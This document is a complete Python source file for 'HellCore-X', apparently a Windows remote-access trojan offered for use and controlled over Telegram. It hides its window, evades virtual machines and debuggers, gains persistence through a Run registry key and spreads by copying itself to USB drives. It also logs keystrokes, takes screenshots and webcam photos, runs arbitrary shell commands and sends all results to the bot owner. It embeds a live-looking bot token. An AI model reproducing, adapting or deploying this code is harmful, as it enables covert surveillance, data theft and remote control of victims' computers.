# HELLCORE-X OneShot
# Ultra-stealth Telegram-controlled malware with USB spreader and full control

import os
import sys
import time
import threading
import requests
import socket
import subprocess
import shutil
import platform
import getpass
import tempfile
import telebot
import ctypes
import base64
import random
import string
import json
import winreg
from uuid import getnode as get_mac
from pynput import keyboard
import pyautogui
import cv2
import psutil

# ================== CONFIG ==================
BOT_TOKEN = "8388440776:AAF2vAJuxw-mKJ-N4JKHqSLru0ogHCAOk1A"
OWNER_ID = 5888374938  # e.g. 123456789
CHANNEL_ID = "@yslearn"  # Optional private log channel

STARTUP_NAME = "WindowsService.exe"
MUTEX_NAME = "HellCoreMutex123"

INJECT_TARGET = "explorer.exe"
SPREAD_DRIVES = ["D", "E", "F", "G", "H", "I", "J"]
SPREADER_FILE_NAME = "WindowsDriver.exe"

TMP_DIR = tempfile.gettempdir()
PERSIST_LOC = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows")
PAYLOAD_PATH = os.path.join(PERSIST_LOC, STARTUP_NAME)

# ============================================

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
keystrokes = []
is_keylogging = False
mutex = False

# ========== UTILITIES ==========
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def hide_window():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass

def make_mutex():
    global mutex
    if mutex: return
    mutex = True
    m = ctypes.windll.kernel32.CreateMutexW(None, 1, MUTEX_NAME)
    if ctypes.GetLastError() == 183:
        sys.exit(0)

def add_to_startup():
    try:
        if not os.path.exists(PERSIST_LOC): os.makedirs(PERSIST_LOC)
        if sys.argv[0] != PAYLOAD_PATH:
            shutil.copy2(sys.argv[0], PAYLOAD_PATH)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WinService", 0, winreg.REG_SZ, PAYLOAD_PATH)
    except: pass

def anti_vm_debug():
    suspicious = ["vbox", "vmware", "virtual", "sandbox", "debug", "wireshark", "procmon", "process hacker"]
    for p in psutil.process_iter():
        try:
            name = p.name().lower()
            if any(s in name for s in suspicious):
                sys.exit(0)
        except: continue

def system_info():
    info = f"<b>👤 User:</b> {getpass.getuser()}\n"
    info += f"<b>💻 Host:</b> {platform.node()}\n"
    info += f"<b>🖥️ OS:</b> {platform.system()} {platform.release()}\n"
    info += f"<b>🌐 IP:</b> {requests.get('https://api.ipify.org').text}\n"
    info += f"<b>🔑 MAC:</b> {get_mac()}"
    return info

# ========== MODULES ==========

def keylogger():
    global is_keylogging
    def on_press(key):
        try:
            keystrokes.append(str(key))
        except: pass
    is_keylogging = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def screenshot():
    try:
        img = pyautogui.screenshot()
        path = os.path.join(TMP_DIR, "screen.png")
        img.save(path)
        return path
    except: return None

def webcam_snap():
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        path = os.path.join(TMP_DIR, "webcam.jpg")
        if ret:
            cv2.imwrite(path, frame)
            cam.release()
            return path
    except: return None

# ========== USB SPREADER ==========
def usb_spreader():
    try:
        for drive in SPREAD_DRIVES:
            path = f"{drive}:/"
            if os.path.exists(path):
                dest = os.path.join(path, SPREADER_FILE_NAME)
                shutil.copy2(sys.argv[0], dest)
    except: pass

# ========== BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(msg):
    if msg.from_user.id == OWNER_ID:
        bot.reply_to(msg, "💀 <b>HellCore-X Ready.</b>")

@bot.message_handler(commands=['info'])
def cmd_info(msg):
    if msg.from_user.id == OWNER_ID:
        bot.reply_to(msg, system_info())

@bot.message_handler(commands=['keys'])
def cmd_keys(msg):
    if msg.from_user.id == OWNER_ID:
        if keystrokes:
            log = '\n'.join(keystrokes[-100:])
            bot.reply_to(msg, f"<b>📝 Last Keystrokes:</b>\n{log}")
        else:
            bot.reply_to(msg, "❌ No keystrokes yet.")

@bot.message_handler(commands=['screen'])
def cmd_screen(msg):
    if msg.from_user.id == OWNER_ID:
        path = screenshot()
        if path:
            with open(path, 'rb') as f:
                bot.send_photo(msg.chat.id, f)

@bot.message_handler(commands=['cam'])
def cmd_cam(msg):
    if msg.from_user.id == OWNER_ID:
        path = webcam_snap()
        if path:
            with open(path, 'rb') as f:
                bot.send_photo(msg.chat.id, f)

@bot.message_handler(commands=['exec'])
def cmd_exec(msg):
    if msg.from_user.id == OWNER_ID:
        try:
            out = subprocess.getoutput(msg.text.replace('/exec ', ''))
            bot.reply_to(msg, f"<code>{out}</code>")
        except:
            bot.reply_to(msg, "❌ Failed.")

@bot.message_handler(commands=['destroy'])
def cmd_destroy(msg):
    if msg.from_user.id == OWNER_ID:
        try:
            os.remove(PAYLOAD_PATH)
            bot.reply_to(msg, "💥 Self-destructed")
            sys.exit(0)
        except:
            bot.reply_to(msg, "❌ Failed to delete")

# ========== MAIN ==========
def main():
    make_mutex()
    hide_window()
    anti_vm_debug()
    add_to_startup()
    usb_spreader()
    threading.Thread(target=keylogger, daemon=True).start()
    bot.send_message(OWNER_ID, "<b>🔥 HellCore-X connected</b>\n" + system_info())
    bot.infinity_polling()

if __name__ == '__main__':
    main()
